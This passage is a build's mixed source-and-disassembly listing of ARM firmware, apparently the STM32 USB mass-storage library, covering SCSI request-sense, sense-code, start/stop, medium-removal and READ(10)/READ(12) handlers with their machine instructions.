 800a390:	693b      	ldr	r3, [r7, #16]
 800a392:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a396:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a39a:	3301      	adds	r3, #1
 800a39c:	b2da      	uxtb	r2, r3
 800a39e:	693b      	ldr	r3, [r7, #16]
 800a3a0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3a4:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a3a8:	693b      	ldr	r3, [r7, #16]
 800a3aa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3ae:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a3b2:	2b04      	cmp	r3, #4
 800a3b4:	d105      	bne.n	800a3c2 <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a3b6:	693b      	ldr	r3, [r7, #16]
 800a3b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3bc:	2200      	movs	r2, #0
 800a3be:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a3c2:	693b      	ldr	r3, [r7, #16]
 800a3c4:	2212      	movs	r2, #18
 800a3c6:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a3c8:	687b      	ldr	r3, [r7, #4]
 800a3ca:	3304      	adds	r3, #4
 800a3cc:	781b      	ldrb	r3, [r3, #0]
 800a3ce:	2b12      	cmp	r3, #18
 800a3d0:	d805      	bhi.n	800a3de <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a3d2:	687b      	ldr	r3, [r7, #4]
 800a3d4:	3304      	adds	r3, #4
 800a3d6:	781b      	ldrb	r3, [r3, #0]
 800a3d8:	461a      	mov	r2, r3
 800a3da:	693b      	ldr	r3, [r7, #16]
 800a3dc:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a3de:	2300      	movs	r3, #0
}
 800a3e0:	4618      	mov	r0, r3
 800a3e2:	3718      	adds	r7, #24
 800a3e4:	46bd      	mov	sp, r7
 800a3e6:	bd80      	pop	{r7, pc}

0800a3e8 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a3e8:	b480      	push	{r7}
 800a3ea:	b085      	sub	sp, #20
 800a3ec:	af00      	add	r7, sp, #0
 800a3ee:	6078      	str	r0, [r7, #4]
 800a3f0:	4608      	mov	r0, r1
 800a3f2:	4611      	mov	r1, r2
 800a3f4:	461a      	mov	r2, r3
 800a3f6:	4603      	mov	r3, r0
 800a3f8:	70fb      	strb	r3, [r7, #3]
 800a3fa:	460b      	mov	r3, r1
 800a3fc:	70bb      	strb	r3, [r7, #2]
 800a3fe:	4613      	mov	r3, r2
 800a400:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a402:	687b      	ldr	r3, [r7, #4]
 800a404:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a408:	687b      	ldr	r3, [r7, #4]
 800a40a:	32b0      	adds	r2, #176	; 0xb0
 800a40c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a410:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a412:	68fb      	ldr	r3, [r7, #12]
 800a414:	2b00      	cmp	r3, #0
 800a416:	d03d      	beq.n	800a494 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a418:	68fb      	ldr	r3, [r7, #12]
 800a41a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a41e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a422:	461a      	mov	r2, r3
 800a424:	68fb      	ldr	r3, [r7, #12]
 800a426:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a42a:	78b9      	ldrb	r1, [r7, #2]
 800a42c:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a430:	68fb      	ldr	r3, [r7, #12]
 800a432:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a436:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a43a:	68fa      	ldr	r2, [r7, #12]
 800a43c:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a440:	00db      	lsls	r3, r3, #3
 800a442:	4413      	add	r3, r2
 800a444:	787a      	ldrb	r2, [r7, #1]
 800a446:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a448:	68fb      	ldr	r3, [r7, #12]
 800a44a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a44e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a452:	68fa      	ldr	r2, [r7, #12]
 800a454:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a458:	00db      	lsls	r3, r3, #3
 800a45a:	4413      	add	r3, r2
 800a45c:	2200      	movs	r2, #0
 800a45e:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a460:	68fb      	ldr	r3, [r7, #12]
 800a462:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a466:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a46a:	3301      	adds	r3, #1
 800a46c:	b2da      	uxtb	r2, r3
 800a46e:	68fb      	ldr	r3, [r7, #12]
 800a470:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a474:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a478:	68fb      	ldr	r3, [r7, #12]
 800a47a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a47e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a482:	2b04      	cmp	r3, #4
 800a484:	d107      	bne.n	800a496 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a486:	68fb      	ldr	r3, [r7, #12]
 800a488:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a48c:	2200      	movs	r2, #0
 800a48e:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a492:	e000      	b.n	800a496 <SCSI_SenseCode+0xae>
    return;
 800a494:	bf00      	nop
  }
}
 800a496:	3714      	adds	r7, #20
 800a498:	46bd      	mov	sp, r7
 800a49a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a49e:	4770      	bx	lr

0800a4a0 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a4a0:	b580      	push	{r7, lr}
 800a4a2:	b086      	sub	sp, #24
 800a4a4:	af00      	add	r7, sp, #0
 800a4a6:	60f8      	str	r0, [r7, #12]
 800a4a8:	460b      	mov	r3, r1
 800a4aa:	607a      	str	r2, [r7, #4]
 800a4ac:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a4ae:	68fb      	ldr	r3, [r7, #12]
 800a4b0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a4b4:	68fb      	ldr	r3, [r7, #12]
 800a4b6:	32b0      	adds	r2, #176	; 0xb0
 800a4b8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a4bc:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a4be:	697b      	ldr	r3, [r7, #20]
 800a4c0:	2b00      	cmp	r3, #0
 800a4c2:	d102      	bne.n	800a4ca <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a4c4:	f04f 33ff 	mov.w	r3, #4294967295
 800a4c8:	e043      	b.n	800a552 <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a4ca:	697b      	ldr	r3, [r7, #20]
 800a4cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4d0:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a4d4:	2b01      	cmp	r3, #1
 800a4d6:	d10f      	bne.n	800a4f8 <SCSI_StartStopUnit+0x58>
 800a4d8:	687b      	ldr	r3, [r7, #4]
 800a4da:	3304      	adds	r3, #4
 800a4dc:	781b      	ldrb	r3, [r3, #0]
 800a4de:	f003 0303 	and.w	r3, r3, #3
 800a4e2:	2b02      	cmp	r3, #2
 800a4e4:	d108      	bne.n	800a4f8 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a4e6:	7af9      	ldrb	r1, [r7, #11]
 800a4e8:	2324      	movs	r3, #36	; 0x24
 800a4ea:	2205      	movs	r2, #5
 800a4ec:	68f8      	ldr	r0, [r7, #12]
 800a4ee:	f7ff ff7b 	bl	800a3e8 <SCSI_SenseCode>

    return -1;
 800a4f2:	f04f 33ff 	mov.w	r3, #4294967295
 800a4f6:	e02c      	b.n	800a552 <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a4f8:	687b      	ldr	r3, [r7, #4]
 800a4fa:	3304      	adds	r3, #4
 800a4fc:	781b      	ldrb	r3, [r3, #0]
 800a4fe:	f003 0303 	and.w	r3, r3, #3
 800a502:	2b01      	cmp	r3, #1
 800a504:	d106      	bne.n	800a514 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a506:	697b      	ldr	r3, [r7, #20]
 800a508:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a50c:	2200      	movs	r2, #0
 800a50e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a512:	e01a      	b.n	800a54a <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a514:	687b      	ldr	r3, [r7, #4]
 800a516:	3304      	adds	r3, #4
 800a518:	781b      	ldrb	r3, [r3, #0]
 800a51a:	f003 0303 	and.w	r3, r3, #3
 800a51e:	2b02      	cmp	r3, #2
 800a520:	d106      	bne.n	800a530 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a522:	697b      	ldr	r3, [r7, #20]
 800a524:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a528:	2202      	movs	r2, #2
 800a52a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a52e:	e00c      	b.n	800a54a <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a530:	687b      	ldr	r3, [r7, #4]
 800a532:	3304      	adds	r3, #4
 800a534:	781b      	ldrb	r3, [r3, #0]
 800a536:	f003 0303 	and.w	r3, r3, #3
 800a53a:	2b03      	cmp	r3, #3
 800a53c:	d105      	bne.n	800a54a <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a53e:	697b      	ldr	r3, [r7, #20]
 800a540:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a544:	2200      	movs	r2, #0
 800a546:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a54a:	697b      	ldr	r3, [r7, #20]
 800a54c:	2200      	movs	r2, #0
 800a54e:	60da      	str	r2, [r3, #12]

  return 0;
 800a550:	2300      	movs	r3, #0
}
 800a552:	4618      	mov	r0, r3
 800a554:	3718      	adds	r7, #24
 800a556:	46bd      	mov	sp, r7
 800a558:	bd80      	pop	{r7, pc}

0800a55a <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a55a:	b480      	push	{r7}
 800a55c:	b087      	sub	sp, #28
 800a55e:	af00      	add	r7, sp, #0
 800a560:	60f8      	str	r0, [r7, #12]
 800a562:	460b      	mov	r3, r1
 800a564:	607a      	str	r2, [r7, #4]
 800a566:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a568:	68fb      	ldr	r3, [r7, #12]
 800a56a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a56e:	68fb      	ldr	r3, [r7, #12]
 800a570:	32b0      	adds	r2, #176	; 0xb0
 800a572:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a576:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a578:	697b      	ldr	r3, [r7, #20]
 800a57a:	2b00      	cmp	r3, #0
 800a57c:	d102      	bne.n	800a584 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a57e:	f04f 33ff 	mov.w	r3, #4294967295
 800a582:	e015      	b.n	800a5b0 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a584:	687b      	ldr	r3, [r7, #4]
 800a586:	3304      	adds	r3, #4
 800a588:	781b      	ldrb	r3, [r3, #0]
 800a58a:	2b00      	cmp	r3, #0
 800a58c:	d106      	bne.n	800a59c <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a58e:	697b      	ldr	r3, [r7, #20]
 800a590:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a594:	2200      	movs	r2, #0
 800a596:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a59a:	e005      	b.n	800a5a8 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a59c:	697b      	ldr	r3, [r7, #20]
 800a59e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5a2:	2201      	movs	r2, #1
 800a5a4:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a5a8:	697b      	ldr	r3, [r7, #20]
 800a5aa:	2200      	movs	r2, #0
 800a5ac:	60da      	str	r2, [r3, #12]

  return 0;
 800a5ae:	2300      	movs	r3, #0
}
 800a5b0:	4618      	mov	r0, r3
 800a5b2:	371c      	adds	r7, #28
 800a5b4:	46bd      	mov	sp, r7
 800a5b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a5ba:	4770      	bx	lr

0800a5bc <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a5bc:	b580      	push	{r7, lr}
 800a5be:	b086      	sub	sp, #24
 800a5c0:	af00      	add	r7, sp, #0
 800a5c2:	60f8      	str	r0, [r7, #12]
 800a5c4:	460b      	mov	r3, r1
 800a5c6:	607a      	str	r2, [r7, #4]
 800a5c8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a5ca:	68fb      	ldr	r3, [r7, #12]
 800a5cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a5d0:	68fb      	ldr	r3, [r7, #12]
 800a5d2:	32b0      	adds	r2, #176	; 0xb0
 800a5d4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a5d8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a5da:	697b      	ldr	r3, [r7, #20]
 800a5dc:	2b00      	cmp	r3, #0
 800a5de:	d102      	bne.n	800a5e6 <SCSI_Read10+0x2a>
  {
    return -1;
 800a5e0:	f04f 33ff 	mov.w	r3, #4294967295
 800a5e4:	e09d      	b.n	800a722 <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a5e6:	697b      	ldr	r3, [r7, #20]
 800a5e8:	7a1b      	ldrb	r3, [r3, #8]
 800a5ea:	2b00      	cmp	r3, #0
 800a5ec:	f040 808f 	bne.w	800a70e <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a5f0:	697b      	ldr	r3, [r7, #20]
 800a5f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5f6:	7f1b      	ldrb	r3, [r3, #28]
 800a5f8:	b25b      	sxtb	r3, r3
 800a5fa:	2b00      	cmp	r3, #0
 800a5fc:	db0b      	blt.n	800a616 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a5fe:	697b      	ldr	r3, [r7, #20]
 800a600:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a604:	7f59      	ldrb	r1, [r3, #29]
 800a606:	2320      	movs	r3, #32
 800a608:	2205      	movs	r2, #5
 800a60a:	68f8      	ldr	r0, [r7, #12]
 800a60c:	f7ff feec 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a610:	f04f 33ff 	mov.w	r3, #4294967295
 800a614:	e085      	b.n	800a722 <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a616:	697b      	ldr	r3, [r7, #20]
 800a618:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a61c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a620:	2b02      	cmp	r3, #2
 800a622:	d108      	bne.n	800a636 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a624:	7af9      	ldrb	r1, [r7, #11]
 800a626:	233a      	movs	r3, #58	; 0x3a
 800a628:	2202      	movs	r2, #2
 800a62a:	68f8      	ldr	r0, [r7, #12]
 800a62c:	f7ff fedc 	bl	800a3e8 <SCSI_SenseCode>

      return -1;
 800a630:	f04f 33ff 	mov.w	r3, #4294967295
 800a634:	e075      	b.n	800a722 <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a636:	68fb      	ldr	r3, [r7, #12]
 800a638:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a63c:	68fa      	ldr	r2, [r7, #12]
 800a63e:	33b0      	adds	r3, #176	; 0xb0
 800a640:	009b      	lsls	r3, r3, #2
 800a642:	4413      	add	r3, r2
 800a644:	685b      	ldr	r3, [r3, #4]
 800a646:	689b      	ldr	r3, [r3, #8]
 800a648:	7afa      	ldrb	r2, [r7, #11]
 800a64a:	4610      	mov	r0, r2
 800a64c:	4798      	blx	r3
 800a64e:	4603      	mov	r3, r0
 800a650:	2b00      	cmp	r3, #0
 800a652:	d008      	beq.n	800a666 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a654:	7af9      	ldrb	r1, [r7, #11]
 800a656:	233a      	movs	r3, #58	; 0x3a
 800a658:	2202      	movs	r2, #2
 800a65a:	68f8      	ldr	r0, [r7, #12]
 800a65c:	f7ff fec4 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a660:	f04f 33ff 	mov.w	r3, #4294967295
 800a664:	e05d      	b.n	800a722 <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a666:	687b      	ldr	r3, [r7, #4]
 800a668:	3302      	adds	r3, #2
 800a66a:	781b      	ldrb	r3, [r3, #0]
 800a66c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a66e:	687b      	ldr	r3, [r7, #4]
 800a670:	3303      	adds	r3, #3
 800a672:	781b      	ldrb	r3, [r3, #0]
 800a674:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a676:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a678:	687b      	ldr	r3, [r7, #4]
 800a67a:	3304      	adds	r3, #4
 800a67c:	781b      	ldrb	r3, [r3, #0]
 800a67e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a680:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a682:	687a      	ldr	r2, [r7, #4]
 800a684:	3205      	adds	r2, #5
 800a686:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a688:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a68a:	697a      	ldr	r2, [r7, #20]
 800a68c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a690:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a692:	687b      	ldr	r3, [r7, #4]
 800a694:	3307      	adds	r3, #7
 800a696:	781b      	ldrb	r3, [r3, #0]
 800a698:	021b      	lsls	r3, r3, #8
 800a69a:	687a      	ldr	r2, [r7, #4]
 800a69c:	3208      	adds	r2, #8
 800a69e:	7812      	ldrb	r2, [r2, #0]
 800a6a0:	4313      	orrs	r3, r2
 800a6a2:	697a      	ldr	r2, [r7, #20]
 800a6a4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a6a8:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a6aa:	697b      	ldr	r3, [r7, #20]
 800a6ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6b0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a6b2:	697b      	ldr	r3, [r7, #20]
 800a6b4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6b8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6ba:	7af9      	ldrb	r1, [r7, #11]
 800a6bc:	68f8      	ldr	r0, [r7, #12]
 800a6be:	f000 fb0c 	bl	800acda <SCSI_CheckAddressRange>
 800a6c2:	4603      	mov	r3, r0
 800a6c4:	2b00      	cmp	r3, #0
 800a6c6:	da02      	bge.n	800a6ce <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a6c8:	f04f 33ff 	mov.w	r3, #4294967295
 800a6cc:	e029      	b.n	800a722 <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a6ce:	697b      	ldr	r3, [r7, #20]
 800a6d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6d4:	699a      	ldr	r2, [r3, #24]
 800a6d6:	697b      	ldr	r3, [r7, #20]
 800a6d8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6dc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6de:	6979      	ldr	r1, [r7, #20]
 800a6e0:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a6e4:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a6e8:	fb01 f303 	mul.w	r3, r1, r3
 800a6ec:	429a      	cmp	r2, r3
 800a6ee:	d00b      	beq.n	800a708 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a6f0:	697b      	ldr	r3, [r7, #20]
 800a6f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6f6:	7f59      	ldrb	r1, [r3, #29]
 800a6f8:	2320      	movs	r3, #32
 800a6fa:	2205      	movs	r2, #5
 800a6fc:	68f8      	ldr	r0, [r7, #12]
 800a6fe:	f7ff fe73 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a702:	f04f 33ff 	mov.w	r3, #4294967295
 800a706:	e00c      	b.n	800a722 <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a708:	697b      	ldr	r3, [r7, #20]
 800a70a:	2202      	movs	r2, #2
 800a70c:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a70e:	697b      	ldr	r3, [r7, #20]
 800a710:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a714:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a716:	7afb      	ldrb	r3, [r7, #11]
 800a718:	4619      	mov	r1, r3
 800a71a:	68f8      	ldr	r0, [r7, #12]
 800a71c:	f000 fb0a 	bl	800ad34 <SCSI_ProcessRead>
 800a720:	4603      	mov	r3, r0
}
 800a722:	4618      	mov	r0, r3
 800a724:	3718      	adds	r7, #24
 800a726:	46bd      	mov	sp, r7
 800a728:	bd80      	pop	{r7, pc}

0800a72a <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a72a:	b580      	push	{r7, lr}
 800a72c:	b086      	sub	sp, #24
 800a72e:	af00      	add	r7, sp, #0
 800a730:	60f8      	str	r0, [r7, #12]
 800a732:	460b      	mov	r3, r1
 800a734:	607a      	str	r2, [r7, #4]
 800a736:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a738:	68fb      	ldr	r3, [r7, #12]
 800a73a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a73e:	68fb      	ldr	r3, [r7, #12]
 800a740:	32b0      	adds	r2, #176	; 0xb0
 800a742:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a746:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a748:	697b      	ldr	r3, [r7, #20]
 800a74a:	2b00      	cmp	r3, #0
 800a74c:	d102      	bne.n	800a754 <SCSI_Read12+0x2a>
  {
    return -1;
 800a74e:	f04f 33ff 	mov.w	r3, #4294967295
 800a752:	e0a7      	b.n	800a8a4 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a754:	697b      	ldr	r3, [r7, #20]
 800a756:	7a1b      	ldrb	r3, [r3, #8]
 800a758:	2b00      	cmp	r3, #0
 800a75a:	f040 8099 	bne.w	800a890 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a75e:	697b      	ldr	r3, [r7, #20]
 800a760:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a764:	7f1b      	ldrb	r3, [r3, #28]
 800a766:	b25b      	sxtb	r3, r3
 800a768:	2b00      	cmp	r3, #0
 800a76a:	db0b      	blt.n	800a784 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a76c:	697b      	ldr	r3, [r7, #20]
 800a76e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a772:	7f59      	ldrb	r1, [r3, #29]
 800a774:	2320      	movs	r3, #32
 800a776:	2205      	movs	r2, #5
 800a778:	68f8      	ldr	r0, [r7, #12]
 800a77a:	f7ff fe35 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a77e:	f04f 33ff 	mov.w	r3, #4294967295
 800a782:	e08f      	b.n	800a8a4 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a784:	697b      	ldr	r3, [r7, #20]
 800a786:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a78a:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a78e:	2b02      	cmp	r3, #2
 800a790:	d108      	bne.n	800a7a4 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a792:	7af9      	ldrb	r1, [r7, #11]
 800a794:	233a      	movs	r3, #58	; 0x3a
 800a796:	2202      	movs	r2, #2
 800a798:	68f8      	ldr	r0, [r7, #12]
 800a79a:	f7ff fe25 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800a79e:	f04f 33ff 	mov.w	r3, #4294967295
 800a7a2:	e07f      	b.n	800a8a4 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a7a4:	68fb      	ldr	r3, [r7, #12]
 800a7a6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7aa:	68fa      	ldr	r2, [r7, #12]
